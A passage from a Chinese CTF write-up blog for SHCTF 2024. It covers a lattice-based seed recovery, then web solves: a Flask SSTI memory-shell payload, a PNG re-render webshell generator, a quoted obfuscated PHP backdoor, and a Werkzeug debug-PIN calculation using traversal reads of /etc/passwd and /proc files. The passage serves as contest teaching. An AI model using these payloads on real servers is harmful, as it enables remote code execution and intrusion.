</span></span><span style=display:flex><span>            g <span style=color:#f92672>=</span> base <span style=color:#f92672>*</span> prod(map(power, f<span style=color:#f92672>.</span>variables(), shifts))
</span></span><span style=display:flex><span>            G<span style=color:#f92672>.</span>append(g)
</span></span><span style=display:flex><span>    B, monomials <span style=color:#f92672>=</span> G<span style=color:#f92672>.</span>coefficient_matrix()
</span></span><span style=display:flex><span>    monomials <span style=color:#f92672>=</span> vector(monomials)
</span></span><span style=display:flex><span>    factors <span style=color:#f92672>=</span> [monomial(<span style=color:#f92672>*</span>bounds) <span style=color:#66d9ef>for</span> monomial <span style=color:#f92672>in</span> monomials]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i, factor <span style=color:#f92672>in</span> enumerate(factors):
</span></span><span style=display:flex><span>        B<span style=color:#f92672>.</span>rescale_col(i, factor)
</span></span><span style=display:flex><span>    B <span style=color:#f92672>=</span> B<span style=color:#f92672>.</span>dense_matrix()<span style=color:#f92672>.</span>LLL()
</span></span><span style=display:flex><span>    B <span style=color:#f92672>=</span> B<span style=color:#f92672>.</span>change_ring(QQ)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i, factor <span style=color:#f92672>in</span> enumerate(factors):
</span></span><span style=display:flex><span>        B<span style=color:#f92672>.</span>rescale_col(i, <span style=color:#ae81ff>1</span> <span style=color:#f92672>/</span> factor)
</span></span><span style=display:flex><span>    H <span style=color:#f92672>=</span> Sequence([], f<span style=color:#f92672>.</span>parent()<span style=color:#f92672>.</span>change_ring(QQ))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> h <span style=color:#f92672>in</span> filter(<span style=color:#66d9ef>None</span>, B <span style=color:#f92672>*</span> monomials):
</span></span><span style=display:flex><span>        H<span style=color:#f92672>.</span>append(h)
</span></span><span style=display:flex><span>        I <span style=color:#f92672>=</span> H<span style=color:#f92672>.</span>ideal()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> I<span style=color:#f92672>.</span>dimension() <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>            H<span style=color:#f92672>.</span>pop()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> I<span style=color:#f92672>.</span>dimension() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            roots <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> root <span style=color:#f92672>in</span> I<span style=color:#f92672>.</span>variety(ring<span style=color:#f92672>=</span>ZZ):
</span></span><span style=display:flex><span>                root <span style=color:#f92672>=</span> tuple(R(root[var]) <span style=color:#66d9ef>for</span> var <span style=color:#f92672>in</span> f<span style=color:#f92672>.</span>variables())
</span></span><span style=display:flex><span>                roots<span style=color:#f92672>.</span>append(root)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> roots
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> []
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Reconstructing the polynomial</span>
</span></span><span style=display:flex><span>PR<span style=color:#f92672>.&lt;</span>x, y<span style=color:#f92672>&gt;</span> <span style=color:#f92672>=</span> PolynomialRing(Zmod(p))
</span></span><span style=display:flex><span>f <span style=color:#f92672>=</span> ((c[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>80</span>) <span style=color:#f92672>+</span> x) <span style=color:#f92672>*</span> a <span style=color:#f92672>+</span> b <span style=color:#f92672>-</span> ((c[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>80</span>) <span style=color:#f92672>+</span> y)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Finding small roots</span>
</span></span><span style=display:flex><span>roots <span style=color:#f92672>=</span> small_roots(f, (<span style=color:#ae81ff>2</span><span style=color:#f92672>**</span><span style=color:#ae81ff>80</span>, <span style=color:#ae81ff>2</span><span style=color:#f92672>**</span><span style=color:#ae81ff>80</span>), m<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>, d<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Calculating the seed</span>
</span></span><span style=display:flex><span>s1 <span style=color:#f92672>=</span> (c[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>80</span>) <span style=color:#f92672>+</span> roots[<span style=color:#ae81ff>0</span>][<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>seed <span style=color:#f92672>=</span> (s1 <span style=color:#f92672>-</span> b) <span style=color:#f92672>*</span> inverse_mod(a, p) <span style=color:#f92672>%</span> p
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Converting the seed back to bytes</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> bytes<span style=color:#f92672>.</span>fromhex(hex(seed)[<span style=color:#ae81ff>2</span>:])<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>print(flag)  <span style=color:#75715e># Outputs the original flag</span>
</span></span></code></pre></div><h2 id=web-2>web</h2><h3 id=小小cms>小小cms</h3><p>先试了/admin，有登录窗口，默认密码登陆，简单搜查一下，有个数据库里面插入了flag，dump下来发现是假的flag，然后创建了一个用户试了一下前端传马看看是否执行，不行，没办法去搜了一下7.0的漏洞，直接按照这个url进行shell的https://blog.csdn.net/shelter1234567/article/details/138524342，最后上截图</p><p><img alt=18 loading=lazy src=/posts/ctf/shctf2024/18.png></p><h3 id=love_flask>love_flask</h3><p>简单的ssti的内存马，测试是没有回显的，我尝试了两种方法，一种是内部弹shell给我vps没有成功，还有一种是直接执行rce，上马</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>{{ url_for<span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;__builtins__&#39;</span>][<span style=color:#e6db74>&#39;eval&#39;</span>](<span style=color:#e6db74>&#34;app.add_url_rule(&#39;/orange&#39;, &#39;orange&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())&#34;</span>, {<span style=color:#e6db74>&#39;_request_ctx_stack&#39;</span>: url_for<span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;_request_ctx_stack&#39;</span>], <span style=color:#e6db74>&#39;app&#39;</span>: url_for<span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;current_app&#39;</span>]}) }}
</span></span></code></pre></div><p><img alt=19 loading=lazy src=/posts/ctf/shctf2024/19.png></p><h3 id=拜师之旅番外>拜师之旅·番外</h3><p>png的二次渲染，上脚本</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$p <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#ae81ff>0xa3</span>, <span style=color:#ae81ff>0x9f</span>, <span style=color:#ae81ff>0x67</span>, <span style=color:#ae81ff>0xf7</span>, <span style=color:#ae81ff>0x0e</span>, <span style=color:#ae81ff>0x93</span>, <span style=color:#ae81ff>0x1b</span>, <span style=color:#ae81ff>0x23</span>,
</span></span><span style=display:flex><span>           <span style=color:#ae81ff>0xbe</span>, <span style=color:#ae81ff>0x2c</span>, <span style=color:#ae81ff>0x8a</span>, <span style=color:#ae81ff>0xd0</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0xf9</span>, <span style=color:#ae81ff>0xe1</span>, <span style=color:#ae81ff>0xae</span>,
</span></span><span style=display:flex><span>           <span style=color:#ae81ff>0x22</span>, <span style=color:#ae81ff>0xf6</span>, <span style=color:#ae81ff>0xd9</span>, <span style=color:#ae81ff>0x43</span>, <span style=color:#ae81ff>0x5d</span>, <span style=color:#ae81ff>0xfb</span>, <span style=color:#ae81ff>0xae</span>, <span style=color:#ae81ff>0xcc</span>,
</span></span><span style=display:flex><span>           <span style=color:#ae81ff>0x5a</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0xdc</span>, <span style=color:#ae81ff>0x5a</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0xdc</span>, <span style=color:#ae81ff>0xa3</span>, <span style=color:#ae81ff>0x9f</span>,
</span></span><span style=display:flex><span>           <span style=color:#ae81ff>0x67</span>, <span style=color:#ae81ff>0xa5</span>, <span style=color:#ae81ff>0xbe</span>, <span style=color:#ae81ff>0x5f</span>, <span style=color:#ae81ff>0x76</span>, <span style=color:#ae81ff>0x74</span>, <span style=color:#ae81ff>0x5a</span>, <span style=color:#ae81ff>0x4c</span>,
</span></span><span style=display:flex><span>           <span style=color:#ae81ff>0xa1</span>, <span style=color:#ae81ff>0x3f</span>, <span style=color:#ae81ff>0x7a</span>, <span style=color:#ae81ff>0xbf</span>, <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x6b</span>, <span style=color:#ae81ff>0x88</span>, <span style=color:#ae81ff>0x2d</span>,
</span></span><span style=display:flex><span>           <span style=color:#ae81ff>0x60</span>, <span style=color:#ae81ff>0x65</span>, <span style=color:#ae81ff>0x7d</span>, <span style=color:#ae81ff>0x52</span>, <span style=color:#ae81ff>0x9d</span>, <span style=color:#ae81ff>0xad</span>, <span style=color:#ae81ff>0x88</span>, <span style=color:#ae81ff>0xa1</span>,
</span></span><span style=display:flex><span>           <span style=color:#ae81ff>0x66</span>, <span style=color:#ae81ff>0x44</span>, <span style=color:#ae81ff>0x50</span>, <span style=color:#ae81ff>0x33</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$img <span style=color:#f92672>=</span> <span style=color:#a6e22e>imagecreatetruecolor</span>(<span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>32</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> ($y <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $y <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>sizeof</span>($p); $y <span style=color:#f92672>+=</span> <span style=color:#ae81ff>3</span>) {
</span></span><span style=display:flex><span>   $r <span style=color:#f92672>=</span> $p[$y];
</span></span><span style=display:flex><span>   $g <span style=color:#f92672>=</span> $p[$y<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>];
</span></span><span style=display:flex><span>   $b <span style=color:#f92672>=</span> $p[$y<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>];
</span></span><span style=display:flex><span>   $color <span style=color:#f92672>=</span> <span style=color:#a6e22e>imagecolorallocate</span>($img, $r, $g, $b);
</span></span><span style=display:flex><span>   <span style=color:#a6e22e>imagesetpixel</span>($img, <span style=color:#a6e22e>round</span>($y <span style=color:#f92672>/</span> <span style=color:#ae81ff>3</span>), <span style=color:#ae81ff>0</span>, $color);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>imagepng</span>($img,<span style=color:#e6db74>&#39;./1.png&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>执行0=system和post发包1=cat /flag</p><p>然后ctrl+s保存图片用记事本看得到flag</p><p><img alt=20 loading=lazy src=/posts/ctf/shctf2024/20.png></p><h3 id=hacked_website复现>hacked_website(复现)</h3><p>当时扫到了<code>www.zip</code>，下载可以看文件，<del>然后就没思路了</del>当时没想到用d盾扫一下</p><p><img alt=21 loading=lazy src=/posts/ctf/shctf2024/21.png></p><p>可以发现是有后面的，定位一下关键文件</p><p>文件里有这个门</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span> <span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> $a <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;sys&#39;</span>;$b <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;tem&#39;</span>;$x <span style=color:#f92672>=</span> $a<span style=color:#f92672>.</span>$b;<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;SH&#39;</span>])) {$z <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#39;&#39;&#34;</span>;} <span style=color:#66d9ef>else</span> $z <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;SH&#39;</span>];<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>/admin里面登陆一下，fuzz一下密码</p><p><img alt=22 loading=lazy src=/posts/ctf/shctf2024/22.png></p><p>到对应的php里面输入得到flag<del>明明挺简单的为什么没想到解法</del>，当时全在往typecho的cve里面想</p><p><img alt=23 loading=lazy src=/posts/ctf/shctf2024/23.png></p><h3 id=顰复现>顰(复现)</h3><p>应该考察的就是算pin，写题的时候其他的数据都找到了没找到<code>console</code>，不明白为什么不触发orz</p><p>官p给了一个链接<a href=https://werkzeug.palletsprojects.com/en/stable/debug/>调试应用程序 — Werkzeug 中文文档 （3.0.x） (palletsprojects.com)</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>By default, , any subdomain, and are trusted. will trust its argument as well. To change this further, use the debug middleware directly rather than through .localhost.localhost127.0.0.1run_simplehostnameuse_debugger=True
</span></span></code></pre></div><p>需要host是<code>127.0.0.1</code>添加header <code>Host:127.0.0.1</code>剩余的正常都可以找到</p><p><img alt=24 loading=lazy src=/posts/ctf/shctf2024/24.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>/sys/class/net/eth0/address----&gt;b6:45:6c:7d:2e:b1 #mac
</span></span><span style=display:flex><span>/proc/sys/kernel/random/boot_id-----&gt;d45a88e1-3fe4-4156-9e59-3864587b7c87 #private
</span></span><span style=display:flex><span>/proc/self/cgroup		-----&gt;0::/ 
</span></span><span style=display:flex><span>/../../../../../../../etc/passwd-----&gt;root:x:0:0:root:/root:/bin/  #pub
</span></span><span style=display:flex><span>/usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py #挨个试
</span></span></code></pre></div><p>算pin的exp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> itertools <span style=color:#f92672>import</span> chain
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>mac_to_decimal</span>(mac_address):
</span></span><span style=display:flex><span>    hex_pairs <span style=color:#f92672>=</span> mac_address<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;:&#39;</span>)
</span></span><span style=display:flex><span>    decimal_value <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 将每个十六进制对转换为十进制并累加</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> hex_pair <span style=color:#f92672>in</span> hex_pairs:
</span></span><span style=display:flex><span>        decimal_value <span style=color:#f92672>=</span> (decimal_value <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>8</span>) <span style=color:#f92672>+</span> int(hex_pair, <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> decimal_value
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>mac_address <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;b6:45:6c:7d:2e:b1&#34;</span>  <span style=color:#75715e># /sys/class/net/eth0/address</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 调用函数将 MAC 地址转换为十进制数值</span>
</span></span><span style=display:flex><span>mac <span style=color:#f92672>=</span> str(mac_to_decimal(mac_address))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>probably_public_bits <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;root&#39;</span>  <span style=color:#75715e># username 可通过/etc/passwd获取</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;flask.app&#39;</span>,  <span style=color:#75715e># modname默认值</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;Flask&#39;</span>,  <span style=color:#75715e># 默认值</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;/usr/local/lib/python3.10/site-packages/flask/app.py&#39;</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>private_bits <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    mac,  <span style=color:#75715e># mac地址十进制</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;d45a88e1-3fe4-4156-9e59-3864587b7c87&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># /proc/sys/kernel/random/boot_id + /proc/self/cgroup  (name=systemd:) /proc/self/cgroup为空不用看</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>h <span style=color:#f92672>=</span> hashlib<span style=color:#f92672>.</span>sha1()
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> bit <span style=color:#f92672>in</span> chain(probably_public_bits, private_bits):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> bit:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> isinstance(bit, str):
</span></span><span style=display:flex><span>        bit <span style=color:#f92672>=</span> bit<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>    h<span style=color:#f92672>.</span>update(bit)
</span></span><span style=display:flex><span>h<span style=color:#f92672>.</span>update(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;cookiesalt&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cookie_name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;__wzd&#39;</span> <span style=color:#f92672>+</span> h<span style=color:#f92672>.</span>hexdigest()[:<span style=color:#ae81ff>20</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>num <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> num <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>    h<span style=color:#f92672>.</span>update(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;pinsalt&#39;</span>)
</span></span><span style=display:flex><span>    num <span style=color:#f92672>=</span> (<span style=color:#e6db74>&#39;</span><span style=color:#e6db74>%09d</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>%</span> int(h<span style=color:#f92672>.</span>hexdigest(), <span style=color:#ae81ff>16</span>))[:<span style=color:#ae81ff>9</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rv <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> rv <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> group_size <span style=color:#f92672>in</span> <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>3</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> len(num) <span style=color:#f92672>%</span> group_size <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            rv <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;-&#39;</span><span style=color:#f92672>.</span>join(num[x:x <span style=color:#f92672>+</span> group_size]<span style=color:#f92672>.</span>rjust(group_size, <span style=color:#e6db74>&#39;0&#39;</span>)
</span></span><span style=display:flex><span>                          <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(num), group_size))
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        rv <span style=color:#f92672>=</span> num
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(rv)
</span></span></code></pre></div><p>因为每个请求都要host,可以看源码提交</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?__debugger__<span style=color:#f92672>=</span>yes&amp;cmd<span style=color:#f92672>=</span>pinauth&amp;pin<span style=color:#f92672>=</span>293-579-492&amp;s<span style=color:#f92672>=</span>EiqMhkW0qaOHzFnqNEn3
</span></span></code></pre></div><p>获取cookie</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>__wzd6bde80ed812309855c21=1730390066|aad426b2f48c
</span></span></code></pre></div><p><img alt=25 loading=lazy src=/posts/ctf/shctf2024/25.png></p><h1 id=week4>week4</h1><h2 id=crypto-3>crypto</h2><h3 id=mt19937>MT19937</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Cipher <span style=color:#f92672>import</span> AES
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.Padding <span style=color:#f92672>import</span> pad, unpad
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> ast
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MT19937</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self, state<span style=color:#f92672>=</span><span style=color:#66d9ef>None</span>):
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>w, self<span style=color:#f92672>.</span>n, self<span style=color:#f92672>.</span>m, self<span style=color:#f92672>.</span>r <span style=color:#f92672>=</span> <span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>624</span>, <span style=color:#ae81ff>397</span>, <span style=color:#ae81ff>31</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>a <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x9908B0DF</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>u, self<span style=color:#f92672>.</span>d <span style=color:#f92672>=</span> <span style=color:#ae81ff>11</span>, <span style=color:#ae81ff>0xFFFFFFFF</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>s, self<span style=color:#f92672>.</span>b <span style=color:#f92672>=</span> <span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>0x9D2C5680</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>t, self<span style=color:#f92672>.</span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>15</span>, <span style=color:#ae81ff>0xEFC60000</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>l <span style=color:#f92672>=</span> <span style=color:#ae81ff>18</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>index <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>n
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> state:
</span></span><span style=display:flex><span>            <span style=color:#75715e># 确保状态数组长度为624</span>
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>MT <span style=color:#f92672>=</span> list(state)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span> len(self<span style=color:#f92672>.</span>MT) <span style=color:#f92672>&lt;</span> self<span style=color:#f92672>.</span>n:
</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>MT<span style=color:#f92672>.</span>append(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>MT <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>MT[:self<span style=color:#f92672>.</span>n]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>MT <span style=color:#f92672>=</span> [<span style=color:#ae81ff>0</span>] <span style=color:#f92672>*</span> self<span style=color:#f92672>.</span>n
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>twist</span>(self):
</span></span><span style=display:flex><span>        lower_mask <span style=color:#f92672>=</span> (<span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;&lt;</span> self<span style=color:#f92672>.</span>r) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        upper_mask <span style=color:#f92672>=</span> (<span style=color:#f92672>~</span>lower_mask) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFF</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(self<span style=color:#f92672>.</span>n):
</span></span><span style=display:flex><span>            x <span style=color:#f92672>=</span> (self<span style=color:#f92672>.</span>MT[i] <span style=color:#f92672>&amp;</span> upper_mask) <span style=color:#f92672>|</span> (self<span style=color:#f92672>.</span>MT[(i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>%</span> self<span style=color:#f92672>.</span>n] <span style=color:#f92672>&amp;</span> lower_mask)
</span></span><span style=display:flex><span>            xA <span style=color:#f92672>=</span> x <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> x <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>                xA <span style=color:#f92672>^=</span> self<span style=color:#f92672>.</span>a
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>MT[i] <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>MT[(i <span style=color:#f92672>+</span> self<span style=color:#f92672>.</span>m) <span style=color:#f92672>%</span> self<span style=color:#f92672>.</span>n] <span style=color:#f92672>^</span> xA
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>index <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>extract_number</span>(self):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> self<span style=color:#f92672>.</span>index <span style=color:#f92672>&gt;=</span> self<span style=color:#f92672>.</span>n:
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>twist()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        y <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>MT[self<span style=color:#f92672>.</span>index]
</span></span><span style=display:flex><span>        y <span style=color:#f92672>=</span> y <span style=color:#f92672>^</span> ((y <span style=color:#f92672>&gt;&gt;</span> self<span style=color:#f92672>.</span>u) <span style=color:#f92672>&amp;</span> self<span style=color:#f92672>.</span>d)
</span></span><span style=display:flex><span>        y <span style=color:#f92672>=</span> y <span style=color:#f92672>^</span> ((y <span style=color:#f92672>&lt;&lt;</span> self<span style=color:#f92672>.</span>s) <span style=color:#f92672>&amp;</span> self<span style=color:#f92672>.</span>b)
</span></span><span style=display:flex><span>        y <span style=color:#f92672>=</span> y <span style=color:#f92672>^</span> ((y <span style=color:#f92672>&lt;&lt;</span> self<span style=color:#f92672>.</span>t) <span style=color:#f92672>&amp;</span> self<span style=color:#f92672>.</span>c)
</span></span><span style=display:flex><span>        y <span style=color:#f92672>=</span> y <span style=color:#f92672>^</span> (y <span style=color:#f92672>&gt;&gt;</span> self<span style=color:#f92672>.</span>l)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>index <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> y <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFF</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>untemper</span>(y):
</span></span><span style=display:flex><span>    y <span style=color:#f92672>=</span> y <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFF</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Reverse right shift 18</span>
